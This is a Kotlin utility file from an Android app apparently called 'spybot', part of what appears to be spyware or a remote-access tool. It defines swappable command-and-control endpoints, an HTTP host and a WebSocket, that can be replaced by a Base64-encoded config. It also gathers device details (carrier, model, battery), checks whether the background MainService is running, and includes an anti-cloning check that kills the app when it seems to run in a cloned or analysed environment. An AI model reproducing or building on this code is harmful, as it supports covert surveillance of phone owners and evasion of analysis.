package com.spybot.app.Utils

import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.telephony.TelephonyManager
import com.google.gson.Gson
import com.spybot.app.MainService
import java.util.*

class AppTools {
    companion object {
        private const val DEFAULT_DATA = ""

        private val DEFAULT_APP_DATA = AppData(
            host = "http://10.0.2.2:8999/",
            socket = "ws://10.0.2.2:8999/"
        )

        fun getAppData(): AppData {
            if (DEFAULT_DATA.isEmpty()) return DEFAULT_APP_DATA
            return try {
                val json = Base64.getDecoder().decode(DEFAULT_DATA).toString(Charsets.UTF_8)
                Gson().fromJson(json, AppData::class.java) ?: DEFAULT_APP_DATA
            } catch (e: Exception) {
                DEFAULT_APP_DATA
            }
        }

        data class AppData(val host: String, val socket: String)

        fun getAndroidVersion(): Int = Build.VERSION.SDK_INT

        fun getProviderName(context: Context): String {
            return try {
                val manager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                manager.networkOperatorName
            } catch (e: Exception) {
                "Unknown"
            }
        }

        fun getDeviceName(): String {
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            return if (model.lowercase(Locale.getDefault()).startsWith(manufacturer.lowercase(Locale.getDefault()))) {
                model.replaceFirstChar { it.uppercase() }
            } else {
                "${manufacturer.replaceFirstChar { it.uppercase() }} $model"
            }
        }

        fun getBatteryPercentage(context: Context): Int {
            return try {
                val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            } catch (e: Exception) {
                0
            }
        }

        fun isServiceRunning(context: Context, serviceClass: Class<*> = MainService::class.java): Boolean {
            return try {
                val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                manager.getRunningServices(Int.MAX_VALUE).any { it.service.className == serviceClass.name }
            } catch (e: Exception) {
                false
            }
        }

        fun checkAppCloning(activity: Activity) {
            try {
                val path = activity.filesDir.path
                if (path.contains("999") || path.count { it == '.' } > 2) {
                    activity.finish()
                    android.os.Process.killProcess(android.os.Process.myPid())
                }
            } catch (e: Exception) {}
        }
    }
}
